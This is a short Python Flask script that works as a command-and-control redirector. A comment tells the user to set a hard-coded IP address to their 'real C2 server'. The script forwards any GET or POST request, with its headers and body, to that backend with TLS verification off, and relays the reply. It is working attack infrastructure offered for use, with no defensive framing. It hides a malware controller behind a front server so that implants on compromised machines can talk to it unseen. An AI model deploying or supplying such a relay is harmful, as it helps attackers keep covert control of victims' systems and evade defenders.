from flask import Flask, request, Response
import requests

app = Flask(__name__)

# Change this to your real C2 server address (IP or domain)
C2_BACKEND = "http://34.230.21.94"

@app.route('/', defaults={'path': ''}, methods=["GET", "POST"])
@app.route('/<path:path>', methods=["GET", "POST"])
def redirector(path):
    url = f"{C2_BACKEND}/{path}"
    try:
        headers = {key: value for key, value in request.headers if key.lower() != 'host'}
        method = request.method

        if method == 'GET':
            resp = requests.get(url, headers=headers, params=request.args, verify=False)
        elif method == 'POST':
            resp = requests.post(url, headers=headers, data=request.get_data(), verify=False)

        excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
        response_headers = [(name, value) for name, value in resp.raw.headers.items() if name.lower() not in excluded_headers]
        return Response(resp.content, resp.status_code, response_headers)

    except Exception as e:
        return f"[!] Redirector error: {str(e)}", 502

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
